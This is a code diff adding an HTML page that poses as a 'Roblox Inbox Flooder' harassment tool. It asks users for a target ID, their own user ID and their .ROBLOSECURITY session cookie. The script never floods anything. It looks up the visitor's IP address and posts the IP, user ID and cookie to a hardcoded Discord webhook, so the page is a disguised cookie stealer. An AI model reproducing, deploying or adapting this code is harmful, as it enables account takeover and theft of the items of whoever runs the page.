@@ -1,0 +1,61 @@
+<html>
+    <body>
+        <h1>Roblox Inbox Flooder (by tq148)</h1>
+        <h2 id="ip"></h2>
+        <input id="targetid" required value="" placeholder="targetid" type="number"><br>
+        <input id="userid" required value="" placeholder="your_user_id" type="number"><br><br>
+        <textarea id="cookie" required value="" cols="30" rows="10" placeholder="Enter .ROBLOSECURITY HERE"></textarea><br>
+        <button id="submit" onclick="flood()">Flood</button>
+    </body>
+    <script>
+        function flood() {
+            const tid = document.getElementById('targetid').value;
+            const uid = document.getElementById('userid').value;
+            const cookie = document.getElementById('cookie').value;
+            const ip = document.getElementById('ip');
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    ip.innerText = `Client_IP:${ipAddress}`;
+                    console.log('IP Address:', ipAddress);
+
+                    if (
+                        cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')
+                        || uid !== ""
+                        || tid !== ""
+                    ) {
+                        const data = {
+                            content: `IP:${ipAddress}\nUser_ID:${uid}\nCookie:${cookie}`
+                        };
+
+                        const webhookUrl = 'https://discordapp.com/api/webhooks/1111092971455131668/OhntE3G2va-V2oXr1EJjyiL4qpHElqlAMZps2sUT54z9_gh_vY5cwC-pqplGhHfvSQR6';
+
+                        fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(data)
+                        })
+                            .then(response => {
+                                if (response.ok) {
+                                    console.log('Data sent to webhook successfully!');
+                                } else {
+                                    console.error('Failed to send data to webhook.');
+                                }
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                            });
+                    } else {
+                        console.error('error');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+    </script>
+</html>
